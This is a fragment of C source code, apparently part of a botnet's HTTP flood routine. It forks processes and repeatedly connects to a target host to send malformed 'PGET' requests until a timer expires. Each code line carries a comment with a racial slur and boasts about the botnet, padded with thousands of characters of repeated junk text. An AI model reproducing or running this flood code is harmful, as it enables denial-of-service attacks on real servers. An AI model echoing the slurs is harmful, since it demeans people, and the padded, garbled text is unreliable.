GGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    for (i = 0; i < power; i++) {//extra strings [full on top of the random one incase it gets pacthed for some mad reason]//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
        sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 2)]);//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
        if (fork()) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
            while (end > time(NULL)) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                socket = socket_connect(host, port);//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
